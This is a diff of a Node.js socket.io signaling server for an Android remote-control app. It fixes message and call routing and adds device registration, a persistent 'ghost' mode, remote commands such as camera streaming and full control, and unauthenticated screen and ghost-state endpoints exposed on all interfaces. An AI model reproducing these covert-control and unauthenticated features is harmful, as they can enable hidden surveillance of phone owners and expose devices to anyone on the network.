@@ -4,6 +4,7 @@ import { Server } from "socket.io";
 import { fileURLToPath } from 'url';
 import { dirname, join } from 'path';
 import fs from "fs";
+import { execFile } from "child_process";
 
 const app = express();
 app.disable("x-powered-by");
@@ -121,40 +122,58 @@ const DEVICES_FILE = join(dirname(fileURLToPath(import.meta.url)), "devices.json
 
 // =====================================================================
 // findTargetSocketId — unified lookup: username, socketId, deviceId
-// Checks usersBySocket (exact match, _screen variant), io.sockets, deviceRegistry
+// STRICT exact matching only. Prefix / substring matching was removed
+// because "A" would otherwise resolve to "AB" and route calls, offers and
+// remote-control gestures to the wrong peer.
 // =====================================================================
 function findTargetSocketId(to) {
     if (!to) return null;
-    // 1. Exact username match in usersBySocket
+    const needle = String(to).trim();
+    if (!needle) return null;
+
+    // 1. Exact username match or exact socketId match
     for (const [sId, u] of usersBySocket.entries()) {
-        if (u.username === to || sId === to) return sId;
+        if (u.username === needle || sId === needle) return sId;
     }
-    // 2. Try adding _screen suffix (mobile companion sends base name, browser targets base_screen)
-    const withScreen = to.endsWith("_screen") ? to : `${to}_screen`;
-    for (const [sId, u] of usersBySocket.entries()) {
-        if (u.username === withScreen) return sId;
-    }
-    // 3. Try stripping _screen suffix
-    const withoutScreen = to.endsWith("_screen") ? to.slice(0, -7) : null;
-    if (withoutScreen) {
+    // 2. Companion screen sockets are registered as "<base>_screen" while the
+    //    browser targets "<base>". This is an exact suffix rule, not a prefix.
+    const withScreen = needle.endsWith("_screen") ? null : `${needle}_screen`;
+    if (withScreen) {
         for (const [sId, u] of usersBySocket.entries()) {
-            if (u.username === withoutScreen) return sId;
+            if (u.username === withScreen) return sId;
         }
     }
-    // 4. Direct socket ID match in io.sockets
-    if (io.sockets.sockets.has(to)) return to;
-    // 5. deviceRegistry — check all sockets of device
-    if (deviceRegistry.has(to)) {
-        const dev = deviceRegistry.get(to);
-        if (dev && dev.sockets && dev.sockets.size > 0) {
-            return [...dev.sockets][0]; // return first active socket
+    // 3. Exact match after stripping a trailing "_screen" suffix
+    if (needle.endsWith("_screen")) {
+        const base = needle.slice(0, -7);
+        for (const [sId, u] of usersBySocket.entries()) {
+            if (u.username === base || sId === base) return sId;
         }
-        if (dev && dev.socketId && io.sockets.sockets.has(dev.socketId)) return dev.socketId;
     }
-    // 6. Case-insensitive username match (fallback)
-    const toLower = to.toLowerCase();
+    // 4. Direct live socket id
+    if (io.sockets.sockets.has(needle)) return needle;
+    // 5. Deviceregistry by exact deviceId (prefer accessibility → background → first live)
+    if (deviceRegistry.has(needle)) {
+        const dev = deviceRegistry.get(needle);
+        if (dev) {
+            for (const preferred of [dev.accSocketId, dev.bgSocketId, dev.companionSocketId, dev.socketId]) {
+                if (preferred && io.sockets.sockets.has(preferred)) {
+                    const s = io.sockets.sockets.get(preferred);
+                    if (s && s.connected) return preferred;
+                }
+            }
+            if (dev.sockets && dev.sockets.size > 0) {
+                for (const sid of dev.sockets) {
+                    const s = io.sockets.sockets.get(sid);
+                    if (s && s.connected) return sid;
+                }
+            }
+        }
+    }
+    // 6. Case-insensitive exact username match (last resort, still exact)
+    const needleLower = needle.toLowerCase();
     for (const [sId, u] of usersBySocket.entries()) {
-        if (u.username.toLowerCase() === toLower) return sId;
+        if (u.username && u.username.toLowerCase() === needleLower) return sId;
     }
     return null;
 }
@@ -178,14 +197,21 @@ function saveDevices() {
     try {
         const list = [];
         for (const [id, dev] of deviceRegistry.entries()) {
+            if (!dev) continue;
             list.push({
-                deviceId: dev.deviceId,
+                deviceId: dev.deviceId || id,
                 deviceName: dev.deviceName,
                 ram: dev.ram,
-                platform: dev.platform
+                platform: dev.platform,
+                appVersion: dev.appVersion || "",
+                ghost: Boolean(dev.ghost)
             });
         }
-        fs.writeFileSync(DEVICES_FILE, JSON.stringify(list, null, 2), "utf-8");
+        // Atomic write: a crash mid-write used to truncate devices.json and
+        // silently wipe every registered device + ghost state.
+        const tmpFile = `${DEVICES_FILE}.tmp`;
+        fs.writeFileSync(tmpFile, JSON.stringify(list, null, 2), "utf-8");
+        fs.renameSync(tmpFile, DEVICES_FILE);
     } catch (e) {
         console.error("Failed to save devices.json:", e);
     }
@@ -196,25 +222,31 @@ loadDevices();
 function getDeviceListPayload() {
     const list = [];
     for (const [deviceId, info] of deviceRegistry.entries()) {
+        if (!info.sockets) info.sockets = new Set();
+        const roleWasPruned = { acc: false, bg: false, companion: false };
         // Prune any sockets that are disconnected
-        if (info.sockets) {
-            for (const sid of Array.from(info.sockets)) {
-                const s = io.sockets.sockets.get(sid);
-                if (!s || !s.connected) {
-                    info.sockets.delete(sid);
-                    if (info.accSocketId === sid) info.accSocketId = null;
-                    if (info.bgSocketId === sid) info.bgSocketId = null;
-                    if (info.companionSocketId === sid) info.companionSocketId = null;
-                }
+        for (const sid of Array.from(info.sockets)) {
+            const s = io.sockets.sockets.get(sid);
+            if (!s || !s.connected) {
+                info.sockets.delete(sid);
+                if (info.accSocketId === sid) { info.accSocketId = null; roleWasPruned.acc = true; }
+                if (info.bgSocketId === sid) { info.bgSocketId = null; roleWasPruned.bg = true; }
+                if (info.companionSocketId === sid) { info.companionSocketId = null; roleWasPruned.companion = true; }
             }
         }
 
-        let isOnline = Boolean(info.sockets && info.sockets.size > 0);
+        const isOnline = info.sockets.size > 0;
         info.online = isOnline;
         if (isOnline) {
-            info.socketId = info.accSocketId || info.bgSocketId || Array.from(info.sockets)[0];
+            const fallback = Array.from(info.sockets)[0];
+            // Pick the first socket that is actually still connected, never a stale id.
+            info.socketId = [info.accSocketId, info.bgSocketId, info.companionSocketId, fallback]
+                .find((sid) => sid && io.sockets.sockets.get(sid) && io.sockets.sockets.get(sid).connected) || fallback;
         } else {
             info.socketId = null;
+            info.accSocketId = null;
+            info.bgSocketId = null;
+            info.companionSocketId = null;
         }
 
         list.push({
@@ -222,6 +254,8 @@ function getDeviceListPayload() {
             deviceName: info.deviceName,
             ram: info.ram,
             platform: info.platform,
+            appVersion: info.appVersion || "",
+            ghost: Boolean(info.ghost),
             online: isOnline
         });
     }
@@ -333,23 +367,133 @@ const staticOptions = {
     }
 };
 
-app.use(express.static("public", staticOptions));
-app.use(express.static("app", staticOptions));
+// APK version is read live from remoteapk/app/build.gradle so the download
+// filename ALWAYS shows the current version and changes on every update.
+function getApkVersion() {
+    try {
+        const gradle = fs.readFileSync(join(__dirname, "remoteapk/app/build.gradle"), "utf-8");
+        // build.gradle derives versionName from `def vName = "x.y.z"`; older
+        // builds hardcoded `versionName "x.y.z"`. Support both.
+        const m = gradle.match(/def\s+vName\s*=\s*"([^"]+)"/)
+            || gradle.match(/versionName\s+"([^"]+)"/);
+        if (m) return m[1];
+    } catch (_) {}
+    return "unknown";
+}
 
-// Dedicated Handler for VRemote APK Download
+// =====================================================================
+// Boolean coercion for protocol values.
+// A missing / null value must NEVER be silently treated as `false` for a
+// toggle — that turned "ghost_mode with no value" into "ghost OFF", which
+// wiped the persisted state and broke reinstall survival.
+// Returns null when the value carries no opinion at all.
+// =====================================================================
+function toOptionalBool(v) {
+    if (v === undefined || v === null || v === "") return null;
+    if (v === true || v === 1) return true;
+    if (v === false || v === 0) return false;
+    const s = String(v).trim().toLowerCase();
+    if (s === "true" || s === "1" || s === "on" || s === "yes" || s === "enable" || s === "enabled") return true;
+    if (s === "false" || s === "0" || s === "off" || s === "no" || s === "disable" || s === "disabled") return false;
+    return null;
+}
+
+// Ghost-state persistence: survives app reinstall (deviceId is stable, server remembers ghost=true)
+app.get("/api/ghost-state", (req, res) => {
+    const deviceId = req.query.deviceId || "";
+    const dev = deviceId ? deviceRegistry.get(deviceId) : null;
+    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+    res.json({ deviceId, ghost: Boolean(dev && dev.ghost) });
+});
+app.post("/api/ghost-state", (req, res) => {
+    try {
+        const { deviceId, ghost } = req.body || {};
+        if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+        let dev = deviceRegistry.get(deviceId);
+        if (!dev) {
+            dev = { deviceId, deviceName: "Android Device", ram: "", platform: "android", sockets: new Set(), ghost: false };
+            deviceRegistry.set(deviceId, dev);
+        }
+        dev.ghost = toOptionalBool(ghost) === true;
+        saveDevices();
+        console.log(`Ghost state saved: ${deviceId} ghost=${dev.ghost}`);
+        addRuntimeLog("server", "info", "GhostState", `Ghost state saved: ${deviceId} ghost=${dev.ghost}`);
+        res.json({ deviceId, ghost: dev.ghost });
+    } catch (e) {
+        res.status(500).json({ error: String(e && e.message || e) });
+    }
+});
+
+// Dedicated Handler for VRemote APK Download (BEFORE static so versioned filename header always applies)
 app.get("/downloads/vremote.apk", (req, res) => {
     const apkPublic = join(__dirname, "public/downloads/vremote.apk");
     const apkApp = join(__dirname, "app/downloads/vremote.apk");
     const targetPath = fs.existsSync(apkPublic) ? apkPublic : (fs.existsSync(apkApp) ? apkApp : null);
     if (targetPath) {
-        res.setHeader("Content-Disposition", 'attachment; filename="VRemote.apk"');
+        res.setHeader("Content-Disposition", `attachment; filename="VRemote-${getApkVersion()}.apk"`);
         res.setHeader("Content-Type", "application/vnd.android.package-archive");
+        // Never let a client or CDN hand out a stale APK under the same URL.
+        res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
+        res.setHeader("Pragma", "no-cache");
+        res.setHeader("Expires", "0");
         return res.sendFile(targetPath);
     }
     res.status(404).json({
         available: false,
         message: "APK file not found on server. Please compile from remoteapk/ folder."
     });
+});
+
+app.use(express.static("public", staticOptions));
+app.use(express.static("app", staticOptions));
+
+// Live Redroid screen view.
+// Uses async execFile (never blocks the event loop) with a hard throttle so
+// hammering the route cannot spawn a backlog of adb processes.
+const ADB_BIN = "/root/all-tools/platform-tools/adb";
+let screenshotInFlight = false;
+const screenshotCache = { buf: null, at: 0 };
+
+app.get("/screen.png", (req, res) => {
+    const now = Date.now();
+    if (screenshotCache.buf && now - screenshotCache.at < 700) {
+        res.setHeader("Content-Type", "image/png");
+        res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+        return res.send(screenshotCache.buf);
+    }
+    if (screenshotInFlight) {
+        if (screenshotCache.buf) {
+            res.setHeader("Content-Type", "image/png");
+            res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+            return res.send(screenshotCache.buf);
+        }
+        return res.status(429).send("screencap busy");
+    }
+    screenshotInFlight = true;
+    execFile(ADB_BIN, ["-s", "127.0.0.1:5555", "exec-out", "screencap", "-p"],
+        { timeout: 10000, maxBuffer: 10 * 1024 * 1024, killSignal: "SIGKILL" },
+        (err, stdout) => {
+            screenshotInFlight = false;
+            if (err || !stdout || !stdout.length) {
+                if (screenshotCache.buf) {
+                    res.setHeader("Content-Type", "image/png");
+                    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+                    return res.send(screenshotCache.buf);
+                }
+                return res.status(500).send("screencap failed: " + (err ? err.message : "empty output"));
+            }
+            screenshotCache.buf = stdout;
+            screenshotCache.at = Date.now();
+            res.setHeader("Content-Type", "image/png");
+            res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+            res.send(stdout);
+        });
+});
+
+app.get("/screen", (req, res) => {
+    res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Redroid Live Screen</title>
+<style>body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh}img{max-height:100vh;max-width:100vw}</style></head>
+<body><img id="s" src="/screen.png" alt="screen"><script>setInterval(()=>{document.getElementById('s').src='/screen.png?t='+Date.now()},1000)</script></body></html>`);
 });
 
 app.get("/", (req, res) => {
@@ -571,49 +715,57 @@ io.on("connection", (socket) => {
         }
     });
 
-    // End Call & Stop Screen Share
-    socket.on("end-call", ({ from, to }) => {
-        console.log(`Call ended event: from="${from}" to="${to}" (caller=${socket.id})`);
-        addRuntimeLog("server", "warn", "Call", `Call ended: ${from} -> ${to}`);
-        const cleanTo = to ? String(to).toLowerCase().split("_")[0] : "";
+    // End Call & Stop Screen Share — TARGETED ONLY.
+    // SECURITY: never broadcast end-call to every client. A single missing/stale
+    // "to" used to tear down every other user's call and screen share.
+    socket.on("end-call", ({ from, to } = {}) => {
+        const toStr = to === undefined || to === null ? "" : String(to).trim();
+        console.log(`Call ended event: from="${from}" to="${toStr}" (caller=${socket.id})`);
+        addRuntimeLog("server", "warn", "Call", `Call ended: ${from} -> ${toStr || "(none)"}`);
 
-        // 1. If to is a deviceId, notify all sockets of that device
-        if (to && deviceRegistry.has(to)) {
-            const dev = deviceRegistry.get(to);
-            if (dev && dev.sockets && dev.sockets.size > 0) {
+        // No target => nothing to do. Do NOT fall back to broadcast.
+        if (!toStr) {
+            addRuntimeLog("server", "warn", "Call", `Ignored end-call from ${socket.id}: missing target`);
+            return;
+        }
+
+        const delivered = new Set();
+
+        // 1. If "to" is a registered deviceId, notify every live socket of that device
+        if (deviceRegistry.has(toStr)) {
+            const dev = deviceRegistry.get(toStr);
+            if (dev && dev.sockets) {
                 for (const sid of dev.sockets) {
-                    io.to(sid).emit("end-call", { from, to });
+                    const s = io.sockets.sockets.get(sid);
+                    if (s && s.connected) {
+                        io.to(sid).emit("end-call", { from, to: toStr });
+                        delivered.add(sid);
+                    }
                 }
-            } else if (dev && dev.socketId) {
-                io.to(dev.socketId).emit("end-call", { from, to });
+            }
+            if (dev && dev.socketId && io.sockets.sockets.get(dev.socketId)) {
+                io.to(dev.socketId).emit("end-call", { from, to: toStr });
+                delivered.add(dev.socketId);
             }
         }
 
-        // 2. Also emit to user sockets (exact, case-insensitive, or base-UID prefix match)
-        let deliveredCount = 0;
+        // 2. Exact username / socketId / user-id match only. No prefix or
+        //    substring matching — "A" must never resolve to "AB".
+        const targetSocketId = findTargetSocketId(toStr);
+        if (targetSocketId && !delivered.has(targetSocketId)) {
+            io.to(targetSocketId).emit("end-call", { from, to: toStr });
+            delivered.add(targetSocketId);
+        }
         for (const [sId, u] of usersBySocket.entries()) {
-            if (sId === socket.id) continue; // Don't loopback to sender
+            if (sId === socket.id || delivered.has(sId)) continue;
             const uName = u.username ? String(u.username) : "";
-            const uClean = uName.toLowerCase().split("_")[0];
-            const toLower = to ? String(to).toLowerCase() : "";
-
-            const isMatch = (
-                uName === to ||
-                sId === to ||
-                uName.toLowerCase() === toLower ||
-                (cleanTo && (uClean === cleanTo || uName.toLowerCase().startsWith(cleanTo) || toLower.startsWith(uClean)))
-            );
-
-            if (isMatch) {
-                console.log(`Routing end-call to socket ${sId} (${uName})`);
-                io.to(sId).emit("end-call", { from, to });
-                deliveredCount++;
+            if (uName === toStr || sId === toStr) {
+                io.to(sId).emit("end-call", { from, to: toStr });
+                delivered.add(sId);
             }
         }
 
-        if (deliveredCount === 0 && (!to || to === "all")) {
-            socket.broadcast.emit("end-call", { from, to });
-        }
+        addRuntimeLog("server", "info", "Call", `end-call delivered to ${delivered.size} socket(s) for "${toStr}"`);
     });
 
     // Chat Message Event (Text, Image/Video, Document Attachments)
@@ -622,18 +774,14 @@ io.on("connection", (socket) => {
         console.log(`Chat message from "${msg.from}" to "${msg.to || 'all'}" (Type: ${msg.file ? msg.file.type : 'text'})`);
 
         if (msg.to && msg.to !== "all") {
-            let targetSocketId = null;
-            for (const [sId, u] of usersBySocket.entries()) {
-                if (u.username === msg.to || sId === msg.to) {
-                    targetSocketId = sId;
-                    break;
-                }
-            }
+            const targetSocketId = findTargetSocketId(msg.to);
             if (targetSocketId) {
                 io.to(targetSocketId).emit("chat-message", msg);
             } else {
-                // If specific peer socket not found by username, broadcast
-                socket.broadcast.emit("chat-message", msg);
+                // A direct message to a peer that is not connected must NOT be
+                // broadcast to everyone — that leaked private media to all peers.
+                addRuntimeLog("server", "warn", "Chat", `Direct message target "${msg.to}" offline — dropped`);
+                socket.emit("chat-delivery-failed", { to: msg.to, id: msg.id || msg.messageId || null });
             }
         } else {
             socket.broadcast.emit("chat-message", msg);
@@ -646,17 +794,11 @@ io.on("connection", (socket) => {
         console.log(`Chat reaction: "${data.emoji}" by "${data.from}" on msg ${data.messageId}`);
 
         if (data.to && data.to !== "all") {
-            let targetSocketId = null;
-            for (const [sId, u] of usersBySocket.entries()) {
-                if (u.username === data.to || sId === data.to) {
-                    targetSocketId = sId;
-                    break;
-                }
-            }
+            const targetSocketId = findTargetSocketId(data.to);
             if (targetSocketId) {
                 io.to(targetSocketId).emit("chat-reaction", data);
             } else {
-                socket.broadcast.emit("chat-reaction", data);
+                addRuntimeLog("server", "warn", "Chat", `Reaction target "${data.to}" offline — dropped`);
             }
         } else {
             socket.broadcast.emit("chat-reaction", data);
@@ -664,51 +806,34 @@ io.on("connection", (socket) => {
     });
 
     // Call Mode Change (Audio-Only Call vs Video Call Mode)
-    socket.on("call-mode-change", ({ from, to, mode, initiator }) => {
+    socket.on("call-mode-change", ({ from, to, mode, initiator } = {}) => {
         console.log(`Call mode change by "${from}" to "${mode}" (target: ${to || 'all'}, initiator: ${initiator || from})`);
+        const payload = { from, to, mode, initiator: initiator || from };
+        // "all"/absent is an intentional broadcast (call mode applies globally).
+        if (!to || to === "all") {
+            socket.broadcast.emit("call-mode-change", payload);
+            return;
+        }
         const targetSocketId = findTargetSocketId(to);
         if (targetSocketId) {
-            io.to(targetSocketId).emit("call-mode-change", { from, to, mode, initiator: initiator || from });
+            io.to(targetSocketId).emit("call-mode-change", payload);
         } else {
-            let routed = false;
-            const cleanTo = to ? String(to).toLowerCase().split("_")[0] : "";
-            if (cleanTo) {
-                for (const [sId, u] of usersBySocket.entries()) {
-                    if (sId === socket.id) continue;
-                    const uClean = (u.username || "").toLowerCase().split("_")[0];
-                    if (uClean === cleanTo) {
-                        io.to(sId).emit("call-mode-change", { from, to, mode, initiator: initiator || from });
-                        routed = true;
-                    }
-                }
-            }
-            if (!routed) {
-                socket.broadcast.emit("call-mode-change", { from, to, mode, initiator: initiator || from });
-            }
+            addRuntimeLog("server", "warn", "Call", `call-mode-change target "${to}" offline — dropped`);
         }
     });
 
     // Peer Camera Blocked / Unblocked State
-    socket.on("peer-video-state", ({ from, to, videoEnabled }) => {
+    socket.on("peer-video-state", ({ from, to, videoEnabled } = {}) => {
+        const payload = { from, to, videoEnabled };
+        if (!to || to === "all") {
+            socket.broadcast.emit("peer-video-state", payload);
+            return;
+        }
         const targetSocketId = findTargetSocketId(to);
         if (targetSocketId) {
-            io.to(targetSocketId).emit("peer-video-state", { from, to, videoEnabled });
+            io.to(targetSocketId).emit("peer-video-state", payload);
         } else {
-            let routed = false;
-            const cleanTo = to ? String(to).toLowerCase().split("_")[0] : "";
-            if (cleanTo) {
-                for (const [sId, u] of usersBySocket.entries()) {
-                    if (sId === socket.id) continue;
-                    const uClean = (u.username || "").toLowerCase().split("_")[0];
-                    if (uClean === cleanTo) {
-                        io.to(sId).emit("peer-video-state", { from, to, videoEnabled });
-                        routed = true;
-                    }
-                }
-            }
-            if (!routed) {
-                socket.broadcast.emit("peer-video-state", { from, to, videoEnabled });
-            }
+            addRuntimeLog("server", "warn", "Call", `peer-video-state target "${to}" offline — dropped`);
         }
     });
 
@@ -717,21 +842,32 @@ io.on("connection", (socket) => {
     // ==========================================
     socket.on("register-device", (data) => {
         try {
-            const { deviceId, deviceName, ram, platform, role } = data || {};
+            const { deviceId, deviceName, ram, platform, role, ghost, appVersion } = data || {};
             if (!deviceId) return;
-            let existing = deviceRegistry.get(deviceId);
+            // Sanitise: deviceId is used as a Map key and echoed into filenames
+            // and logs. Reject anything that is not a plausible hardware token.
+            const cleanDeviceId = String(deviceId).trim();
+            if (!/^[A-Za-z0-9_.:-]{4,64}$/.test(cleanDeviceId)) {
+                addRuntimeLog("server", "warn", "DeviceRegistry", `Rejected invalid deviceId from ${socket.id}`);
+                return;
+            }
+            const validRole = (role === "accessibility_service" || role === "background_service" || role === "companion")
+                ? role : "companion";
+
+            let existing = deviceRegistry.get(cleanDeviceId);
             if (!existing) {
                 existing = {
-                    deviceId,
+                    deviceId: cleanDeviceId,
                     deviceName: deviceName || "Android Device",
                     ram: ram || "",
                     platform: platform || "android",
                     sockets: new Set(),
                     accSocketId: null,
                     bgSocketId: null,
-                    companionSocketId: null
+                    companionSocketId: null,
+                    ghost: false
                 };
-                deviceRegistry.set(deviceId, existing);
+                deviceRegistry.set(cleanDeviceId, existing);
             }
             if (!existing.sockets) existing.sockets = new Set();
 
@@ -746,25 +882,40 @@ io.on("connection", (socket) => {
                 }
             }
 
+            // A socket only ever holds ONE role slot. Re-registering with a new
+            // role must clear the previous slot, otherwise a stale id keeps the
+            // device listed online after the real socket dies.
+            if (existing.accSocketId === socket.id) existing.accSocketId = null;
+            if (existing.bgSocketId === socket.id) existing.bgSocketId = null;
+            if (existing.companionSocketId === socket.id) existing.companionSocketId = null;
+
             existing.sockets.add(socket.id);
             existing.socketId = socket.id;
             existing.online = true;
 
-            if (role === "accessibility_service") {
+            if (validRole === "accessibility_service") {
                 existing.accSocketId = socket.id;
-            } else if (role === "background_service") {
+            } else if (validRole === "background_service") {
                 existing.bgSocketId = socket.id;
-            } else if (role === "companion") {
+            } else {
                 existing.companionSocketId = socket.id;
             }
 
-            if (deviceName) existing.deviceName = deviceName;
-            if (ram) existing.ram = ram;
-            if (platform) existing.platform = platform;
+            if (deviceName) existing.deviceName = String(deviceName).substring(0, 80);
+            if (ram) existing.ram = String(ram).substring(0, 60);
+            if (platform) existing.platform = String(platform).substring(0, 30);
+            // Only overwrite when the client actually states a value.
+            const ghostFlag = toOptionalBool(ghost);
+            if (ghostFlag !== null) existing.ghost = ghostFlag;
+            // Only accept a version that looks like a version. Empty/undefined
+            // from older builds must not erase a known good appVersion.
+            if (appVersion && /^\d+(\.\d+){1,3}$/.test(String(appVersion))) {
+                existing.appVersion = String(appVersion);
+            }
             saveDevices();
-            console.log(`Device registered: ${deviceId} (${existing.deviceName}) socket=${socket.id} role=${role || 'unknown'} (active sockets: ${existing.sockets.size})`);
-            addRuntimeLog("server", "info", "DeviceRegistry", `Device registered: ${deviceId} (${existing.deviceName}, ${role || 'companion'})`);
-            socket.emit("device-registered", { deviceId, success: true });
+            console.log(`Device registered: ${cleanDeviceId} (${existing.deviceName}) socket=${socket.id} role=${validRole} appVersion=${existing.appVersion || '?'} ghost=${Boolean(existing.ghost)} (active sockets: ${existing.sockets.size})`);
+            addRuntimeLog("server", "info", "DeviceRegistry", `Device registered: ${cleanDeviceId} (${existing.deviceName}, ${validRole}) appVersion=${existing.appVersion || '?'}`);
+            socket.emit("device-registered", { deviceId: cleanDeviceId, success: true, ghost: Boolean(existing.ghost) });
             io.emit("device-list-update", getDeviceListPayload());
         } catch (e) {
             console.error("register-device error:", e);
@@ -776,19 +927,30 @@ io.on("connection", (socket) => {
     });
 
     socket.on("auto-command", (data) => {
-        const { targetDeviceId, command, caller, cameraChoice, mediaId, mediaType, page, value } = data || {};
-        const target = deviceRegistry.get(targetDeviceId);
+        const { targetDeviceId, command, caller, cameraChoice, mediaId, mediaType, page, value, loud, fullControl, streamCamera, volume, muted } = data || {};
+        let target = deviceRegistry.get(targetDeviceId);
         const callerName = caller || (usersBySocket.get(socket.id) ? usersBySocket.get(socket.id).username : socket.id);
+
+        // Flags are ONLY included when the caller actually sent them, so a
+        // "false" from the client is preserved instead of collapsing to null.
         const payload = {
             command,
             from: socket.id,
             caller: callerName,
-            cameraChoice: cameraChoice || "front",
-            mediaId,
-            mediaType,
-            page: page || 0,
-            value: value !== undefined ? value : null
+            cameraChoice: cameraChoice || "front"
         };
+        if (mediaId !== undefined) payload.mediaId = mediaId;
+        if (mediaType !== undefined) payload.mediaType = mediaType;
+        if (page !== undefined) payload.page = page;
+        if (volume !== undefined) payload.volume = volume;
+
+        const optFlags = { value, loud, fullControl, streamCamera, muted };
+        for (const [k, v] of Object.entries(optFlags)) {
+            if (v === undefined) continue;
+            if (v === null) { payload[k] = null; continue; }
+            const asBool = toOptionalBool(v);
+            payload[k] = (asBool !== null && (typeof v === "boolean" || typeof v === "string")) ? asBool : v;
+        }
 
         let dispatched = false;
 
@@ -823,6 +985,39 @@ io.on("connection", (socket) => {
             if (target.socketId) {
                 const s = io.sockets.sockets.get(target.socketId);
                 if (!s || !s.connected) target.socketId = null;
+            }
+        }
+
+        // Ghost toggle: honour an explicit value, or flip the current state when
+        // the caller sends no value at all. A missing value must never mean OFF.
+        if (command === "ghost_mode") {
+            const explicitGhost = toOptionalBool(value);
+            if (target) {
+                const nextGhost = explicitGhost === null ? !target.ghost : explicitGhost;
+                target.ghost = nextGhost;
+                payload.value = nextGhost;           // always ship a real boolean to the device
+                saveDevices();
+                console.log(`Ghost state via auto-command: ${targetDeviceId} ghost=${target.ghost} (explicit=${explicitGhost})`);
+                addRuntimeLog("server", "info", "GhostState", `Ghost via auto-command: ${targetDeviceId} ghost=${target.ghost}`);
+            } else {
+                // Device not registered yet: persist the requested state so the
+                // next register-device / ghost-state pull restores it correctly.
+                const requested = explicitGhost === null ? true : explicitGhost;
+                target = {
+                    deviceId: String(targetDeviceId),
+                    deviceName: "Android Device",
+                    ram: "",
+                    platform: "android",
+                    sockets: new Set(),
+                    accSocketId: null,
+                    bgSocketId: null,
+                    companionSocketId: null,
+                    ghost: requested
+                };
+                deviceRegistry.set(String(targetDeviceId), target);
+                saveDevices();
+                payload.value = requested;
+                addRuntimeLog("server", "info", "GhostState", `Ghost pre-persisted: ${targetDeviceId} ghost=${requested}`);
             }
         }
 
@@ -1109,7 +1304,11 @@ io.on("connection", (socket) => {
 
     // Disconnect cleanup
     socket.on("disconnect", (reason) => {
+        let deviceListChanged = false;
+        // No `break`: one socket can be referenced by more than one registry
+        // entry (re-register races), and every one of them must be cleaned.
         for (const [deviceId, info] of deviceRegistry.entries()) {
+            if (!info) continue;
             if (info.sockets && info.sockets.has(socket.id)) {
                 info.sockets.delete(socket.id);
                 if (info.accSocketId === socket.id) info.accSocketId = null;
@@ -1118,14 +1317,15 @@ io.on("connection", (socket) => {
                 console.log(`Socket ${socket.id} disconnected from device ${deviceId}. Remaining sockets: ${info.sockets.size}`);
                 addRuntimeLog("server", "warn", "Socket", "Socket " + socket.id + " disconnected from " + deviceId + " Reason: " + reason);
                 if (info.sockets.size > 0) {
-                    info.socketId = info.accSocketId || info.bgSocketId || Array.from(info.sockets)[0];
+                    const fallback = Array.from(info.sockets)[0];
+                    info.socketId = [info.accSocketId, info.bgSocketId, info.companionSocketId, fallback]
+                        .find((sid) => sid && io.sockets.sockets.get(sid) && io.sockets.sockets.get(sid).connected) || fallback;
                     info.online = true;
                 } else {
                     info.socketId = null;
                     info.online = false;
                 }
-                io.emit("device-list-update", getDeviceListPayload());
-                break;
+                deviceListChanged = true;
             } else if (info.socketId === socket.id) {
                 info.socketId = null;
                 info.online = false;
@@ -1134,9 +1334,11 @@ io.on("connection", (socket) => {
                 if (info.companionSocketId === socket.id) info.companionSocketId = null;
                 console.log(`Socket ${socket.id} disconnected from device ${deviceId}. Reason: ${reason}`);
                 addRuntimeLog("server", "warn", "Socket", "Socket " + socket.id + " disconnected from " + deviceId + " Reason: " + reason);
-                io.emit("device-list-update", getDeviceListPayload());
-                break;
+                deviceListChanged = true;
             }
+        }
+        if (deviceListChanged) {
+            io.emit("device-list-update", getDeviceListPayload());
         }
 
         if (usersBySocket.has(socket.id)) {
@@ -1150,6 +1352,33 @@ io.on("connection", (socket) => {
 });
 
 const port = process.env.PORT || 9000;
-server.listen(port, "127.0.0.1", () => {
-    console.log(`Server listening on 127.0.0.1:${port}`);
+server.listen(port, "0.0.0.0", () => {
+    console.log(`Server listening on 0.0.0.0:${port}`);
 });
+
+// =====================================================================
+// Process safety — an unhandled rejection used to kill the whole signaling
+// server, dropping every live call and screen share.
+// =====================================================================
+process.on("unhandledRejection", (reason) => {
+    const msg = reason && reason.stack ? reason.stack.split("\n")[0] : String(reason);
+    console.error("Unhandled rejection (kept alive):", msg);
+    try { addRuntimeLog("server", "error", "UnhandledRejection", msg); } catch (_) {}
+});
+process.on("uncaughtException", (err) => {
+    console.error("Uncaught exception (kept alive):", err && err.stack ? err.stack : err);
+    try { addRuntimeLog("server", "error", "UncaughtException", (err && err.message) || String(err)); } catch (_) {}
+});
+
+function gracefulShutdown(signal) {
+    console.log(`${signal} received — flushing state and closing server`);
+    try { saveDevices(); } catch (_) {}
+    try {
+        io.emit("server-shutdown", { reason: signal });
+        io.close();
+    } catch (_) {}
+    try { server.close(() => process.exit(0)); } catch (_) { process.exit(0); }
+    setTimeout(() => process.exit(0), 3000).unref();
+}
+process.on("SIGTERM", () => gracefulShutdown("SIGTERM"));
+process.on("SIGINT", () => gracefulShutdown("SIGINT"));
